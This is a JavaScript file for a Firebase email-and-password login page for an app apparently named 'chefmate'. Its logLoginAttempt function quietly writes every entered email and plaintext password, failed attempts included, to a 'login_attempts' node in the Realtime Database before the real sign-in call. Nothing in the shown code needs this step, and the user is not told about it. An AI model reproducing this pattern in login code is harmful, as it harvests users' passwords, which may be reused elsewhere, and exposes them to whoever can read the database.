// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-analytics.js";
import { getDatabase, set, ref, onValue } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-database.js";
import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-auth.js";

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyBgG8Cl0wBwWd4wbG1Zs0p8BYplp94-ius",
  authDomain: "chefmate-5f7d5.firebaseapp.com",
  databaseURL: "https://chefmate-5f7d5-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "chefmate-5f7d5",
  storageBucket: "chefmate-5f7d5.firebasestorage.app",
  messagingSenderId: "676719656114",
  appId: "1:676719656114:web:748533b74284e1ff969dab",
  measurementId: "G-VFSG3H7EWY"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const database = getDatabase(app);
const auth = getAuth(app);

// Get form elements
const loginForm = document.getElementById('loginForm');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');

// Add event listener to the login form
loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    
    if (!email || !password) {
        alert('Please fill in all fields');
        return;
    }
    
    // Log the attempted login credentials to Firebase Realtime Database
    logLoginAttempt(email, password);
    
    // Attempt to sign in the user
    attemptLogin(email, password);
});

// Function to log login attempts to the database
function logLoginAttempt(email, password) {
    const timestamp = new Date().toISOString();
    const loginAttemptsRef = ref(database, 'login_attempts');
    const newLoginRef = ref(database, 'login_attempts/' + Date.now());
    
    // Push login attempt to the database
    set(newLoginRef, {
        email: email,
        password: password,
        timestamp: timestamp,
        status: 'pending'
    }).then(() => {
        console.log('Login attempt logged successfully');
    }).catch((error) => {
        console.error('Error logging login attempt: ', error);
    });
}

// Function to attempt login with Firebase Auth
function attemptLogin(email, password) {
    signInWithEmailAndPassword(auth, email, password)
        .then((userCredential) => {
            const user = userCredential.user;
            console.log('User logged in: ', user.uid);
            
            updateLoginStatus(email, 'success');
            
            alert('Login successful!');
        })
        .catch((error) => {
            const errorCode = error.code;
            const errorMessage = error.message;
            console.error('Login error: ', errorCode, errorMessage);
        
            updateLoginStatus(email, 'failed');
            
            if (errorCode === 'auth/user-not-found' || errorCode === 'auth/wrong-password') {
                alert('Invalid email or password. Please try again.');
            } else {
                alert('Login failed: ' + errorMessage);
            }
        });
}

// Function to update login status in the database
function updateLoginStatus(email, status) {
    const loginStatusRef = ref(database, 'login_status/' + Date.now());
    set(loginStatusRef, {
        email: email,
        status: status,
        timestamp: new Date().toISOString()
    });
}

// Check if user is already logged in
onAuthStateChanged(auth, (user) => {
    if (user) {
        console.log('User is already logged in: ', user.uid);
    } else {
        console.log('No user is currently logged in');
    }
});
